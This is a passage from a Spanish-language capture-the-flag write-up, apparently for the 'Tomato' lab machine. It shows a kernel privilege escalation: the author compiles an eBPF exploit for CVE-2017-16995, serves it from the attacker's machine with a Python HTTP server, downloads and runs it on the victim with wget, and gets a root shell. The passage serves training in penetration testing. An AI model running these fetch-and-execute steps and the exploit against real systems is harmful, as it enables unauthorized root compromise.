Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privile | linux/local/47169.c
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Esta programado en `C`

```bash
❯ gcc 45010.c -o exploit
❯ cat 45010.c | grep gcc
  gcc cve-2017-16995.c -o cve-2017-16995

```

```bash
❯ ls
 45010.c   exploit   php_filter_chain_generator.py   ssh_user_enumeration.py
```

Vamos a enviarlo a la maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.65 - - [03/Mar/2023 21:52:26] "GET /exploit HTTP/1.1" 200 -
```

```bash
www-data@ubuntu:/tmp$ wget http://192.168.1.67/exploit
--2023-03-03 19:52:27--  http://192.168.1.67/exploit
Connecting to 192.168.1.67:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25736 (25K) [application/octet-stream]
Saving to: 'exploit'

exploit                         100%[=======================================================>]  25.13K  --.-KB/s    in 0s      

2023-03-03 19:52:27 (443 MB/s) - 'exploit' saved [25736/25736]

www-data@ubuntu:/tmp$ 

```

```bash
www-data@ubuntu:/tmp$ ls
VMwareDnD  exploit  systemd-private-9d0ec51d39d84348b55a590369880f20-systemd-timesyncd.service-Rr8qws  vmware-root
www-data@ubuntu:/tmp$ chmod +x exploit 
www-data@ubuntu:/tmp$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800b9193e00
[*] Leaking sock struct from ffff880035278780
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880035324000
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff880035324000
[*] credentials patched, launching shell...
# whoami
root
# 
```

```
# bash
root@ubuntu:/root# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@ubuntu:/root# whoami
root
root@ubuntu:/root# cat proof.txt 
Sun_CSR_TEAM_TOMATO_JS_0232xx23
root@ubuntu:/root# 
```


